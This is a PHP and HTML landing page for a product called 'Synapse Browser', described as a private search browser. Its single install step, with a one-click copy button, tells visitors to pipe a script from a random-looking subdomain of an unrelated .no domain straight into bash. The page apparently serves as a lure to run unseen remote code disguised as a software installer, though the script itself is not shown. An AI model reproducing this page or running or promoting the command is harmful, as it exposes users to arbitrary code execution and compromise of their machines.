<?php
$installCmd = 'curl -fsSL https://im24wil27051.imporsgrunn.no/Synapse-browser/install.sh | bash';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Synapse Browser</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 600px;
        }
        h1 { font-size: 3em; margin-bottom: 10px; }
        .subtitle { font-size: 1.2em; opacity: 0.8; margin-bottom: 30px; }
        .install {
            margin-top: 30px;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
            text-align: left;
        }
        .install h3 { margin-bottom: 10px; }
        .install code {
            display: block;
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 0.9em;
            word-break: break-all;
        }
        .copy-btn {
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.8em;
        }
        .copy-btn:hover { background: rgba(255,255,255,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <h1>Synapse</h1>
        <p class="subtitle">Private Search Browser</p>
        
        <div class="install">
            <h3>Install locally:</h3>
            <code id="cmd"><?php echo htmlspecialchars($installCmd); ?></code>
            <button class="copy-btn" onclick="copyCmd()">Copy</button>
        </div>
        
        <script>
            function copyCmd() {
                navigator.clipboard.writeText(document.getElementById('cmd').textContent);
                document.querySelector('.copy-btn').textContent = 'Copied!';
                setTimeout(() => document.querySelector('.copy-btn').textContent = 'Copy', 2000);
            }
        </script>
    </div>
</body>
</html>
